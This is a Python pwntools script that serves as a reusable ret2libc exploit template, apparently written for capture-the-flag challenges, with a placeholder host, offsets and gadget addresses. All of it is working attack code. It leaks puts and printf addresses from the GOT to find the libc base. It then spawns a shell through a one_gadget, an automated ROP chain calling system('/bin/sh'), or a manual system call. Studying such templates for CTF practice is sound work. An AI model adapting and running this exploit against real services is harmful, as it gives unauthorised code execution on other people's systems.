from pwn import *
context.log_level='debug'

### DECLARE ###
BINARY = "./binary"
URL = "someplace.com"
PORT = 1337
RIP_OFFSET = 0
PROMPT = "Input: "

### initiate ###
elf = context.binary = ELF(BINARY)
rop = ROP(BINARY)
p = remote(URL, PORT)

### leak puts ###
p.sendlineafter(PROMPT, flat(
        b"A"*RIP_OFFSET,
	rop.ret.address,
        rop.rdi.address, elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
))
p.recvline() # program might send multiple lines of nonsense
puts_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard

### leak printf ###
p.sendlineafter(PROMPT, flat(
        b"A"*RIP_OFFSET,
	rop.ret.address,
        rop.rdi.address, elf.got['printf'],
        elf.plt['printf'],
        elf.symbols['main']
))
p.recvline() # program might send multiple lines of nonsense
printf_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard

log.success("libc puts is: " + hex(puts_libc))
log.success("libc printf is: " + hex(printf_libc))
#p.interactive()

### DECLARE ###
libc = ELF('./libc.so.6')

libc.address = puts_libc - libc.symbols.puts
log.success("libc base is " + hex(libc.address))

#================================================

### one_gadget ###
one_gadget = 0xdeadbeef
execve = libc.address +one_gadget
p.sendlineafter(PROMPT, flat(
	b"A"*RIP_OFFSET,
	execve
))

### automated ROP chain ###
rop = ROP([elf, libc])
rop.system(next(libc.search(b"/bin/sh")))
p.sendlineafter(PROMPT, flat(
	"A"*RIP_OFFSET,
	rop.ret.address,
	rop.chain()
))

### kind of manual system call with binsh declared ###
binsh = libc.address + 0xdeadbeef 
#~$ ROPgadget --binary ./libc.so.6 --string "/bin/sh"
p.sendlineafter(PROMPT, flat(
	b"A"*RIP_OFFSET,
	rop.rdi.address,
	binsh,
	rop.ret.address,
	libc.symbols.system
))

p.interactive()
